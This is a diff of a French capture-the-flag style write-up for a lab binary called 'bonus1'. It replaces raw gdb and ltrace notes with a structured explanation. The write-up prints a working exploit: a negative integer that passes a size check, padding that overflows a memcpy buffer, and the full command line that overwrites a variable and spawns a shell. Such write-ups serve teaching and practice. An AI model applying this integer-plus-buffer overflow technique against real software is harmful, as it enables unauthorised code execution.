@@ -1,43 +1,49 @@
-ltrace ./bonus1 9 FLOW
+# Bonus1 - Integer Overflow
 
-atoi(0xbffff83e, 0x8049764, 3, 0x80482fd, 0xb7fd13e4) = 9
-memcpy(0xbffff624, "FLOW", 36)                   = 0xbffff624
+## Contexte
+Le programme prend deux arguments :
+- Un nombre qui doit être inférieur à 9
+- Une chaîne de caractères qui sera copiée
 
-(gdb) set args "9" "FLOW"
+## Vulnérabilités
 
-x/x 0xbffff5f0
-0xbffff5f0:     0xbffff604
+**Integer Overflow**
+- La vérification `nb > 9` est effectuée
+- Un nombre négatif peut passer la vérification
+- Après multiplication par 4, le résultat peut devenir un grand nombre positif
 
-0xbffff604
+**Buffer Overflow**
+- memcpy utilise la taille calculée sans vérification
+- Permet d'écrire au-delà du buffer alloué
 
-(gdb) x/x $esp+0x3c
-0xbffff62c:     0x00000009
+## Exploitation
 
-set args "-12" $(python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A"')
+**Calcul de l'Integer Overflow**
+- Valeur recherchée : -2147483632
+- En binaire : 1000 0000 0000 0000 0000 0000 0000 0011
+- Après multiplication par 4 : 0000 0000 0000 0000 0000 0000 0000 1100
 
-(gdb) x/32wx 0xbffff414
-0xbffff414:     0x41306141      0x61413161      0x33614132      0x41346141
-0xbffff424:     0x61413561      0x37614136      0x41386141      0x62413961
-0xbffff434:     0x31624130      0x080484b9      0x00000009
+**Construction du Payload**
+```python
+# Premier argument : integer overflow
+"-2147483632"
 
-En donnant 9 a memcpy on observe que nous n'avons toujours pas assez d'espace copier pour ecraser le retour de atoi pour y mettre 0x574f4c46
+# Second argument : padding + valeur cible
+"A"*40 + "\x46\x4c\x4f\x57"  # "FLOW" en little-endian
+```
 
-Il va falloir overflow l'int qui, apres une multiplication par 4 (decalage de 2bits a gauche) soit positif, assez grand pour overflow esp+0x3c
+**Commande d'Exploitation**
+```bash
+./bonus1 -2147483632 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
+```
 
-Sachant que le bit de signe est le dernier bit on sait qu'on va devoir etre proche de la max valeur negative de l'int 
+## Processus d'Exploitation
 
-1000 0000 0000 0000 0000 0000 0000 0011 << 2
-= 0000 0000 0000 0000 0000 0000 0000 1100
+1. Le nombre négatif passe la vérification `nb > 9`
+2. La multiplication par 4 transforme ce nombre en valeur positive
+3. memcpy copie suffisamment de données pour atteindre var_3c
+4. La valeur 0x574f4c46 est écrite à l'emplacement de var_3c
+5. La condition est validée et le shell est exécuté
 
--2147483632
-
-"-2147483632" "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A"
-
-Breakpoint 1, 0x08048478 in main ()
-(gdb) x/x $esp+0x3c
-0xbffff5ec:     0x62413362
-
-Avec le buffer overflow pattern generator, j'obtien un offset de 40
-On va pouvoir write 0x574f4c46 apres un padding de 40 bytes
-
-set args "-2147483632" $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
+Citations:
+[1] https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/8881945/28258b1b-41a9-4724-96b4-9da451ac675e/paste.txt
